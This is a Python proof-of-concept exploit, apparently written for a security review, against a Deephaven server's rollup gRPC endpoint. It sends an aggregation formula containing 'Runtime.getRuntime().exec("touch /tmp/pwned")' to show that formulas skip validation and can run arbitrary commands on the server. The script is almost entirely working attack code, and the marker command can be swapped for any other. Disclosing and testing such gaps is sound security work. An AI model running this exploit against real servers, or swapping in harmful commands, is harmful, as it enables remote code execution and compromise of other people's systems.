"""
PoC for Gap 3: HierarchicalTableServiceGrpcImpl.rollup() — aggregation formulas not validated.

Aggregations in the RollupRequest are adapted via AggregationAdapter::adapt and passed
directly to sourceTable.rollup() with no ColumnExpressionValidator check.

Preconditions:
  - A Deephaven server running on localhost:10000
  - A table "t" exists in the global scope (e.g. t = emptyTable(1).update("i = 1"))
"""

from pydeephaven import Session
from pydeephaven.agg import formula
from deephaven_core.proto import hierarchicaltable_pb2, hierarchicaltable_pb2_grpc


def main():
    session = Session(host="localhost", port=10000)
    try:
        t = session.open_table("t")
        print(f"Opened table 't', size={t.size}")

        stub = hierarchicaltable_pb2_grpc.HierarchicalTableServiceStub(session.grpc_channel)

        # formula() with formula_param produces an _AggregationColumns with AggSpecFormula.
        # The rollup path never validates aggregation formulas.
        payload = 'Runtime.getRuntime().exec("touch /tmp/pwned")'
        agg = formula(formula=payload, formula_param="garbage", cols="I")

        result_ticket = session.make_export_ticket()
        request = hierarchicaltable_pb2.RollupRequest(
            result_rollup_table_id=result_ticket.pb_ticket,
            source_table_id=t.ticket.pb_ticket,
            aggregations=[agg.make_grpc_message()],
            group_by_columns=["I"],
        )

        try:
            response = session.wrap_rpc(stub.Rollup, request)
            print(f"Rollup succeeded")
        except Exception as e:
            print(f"Rollup failed: {e}")

        print()
        print("Check: does /tmp/pwned exist on the server?")
        print("  ls -la /tmp/pwned")
    finally:
        session.close()


if __name__ == "__main__":
    main()

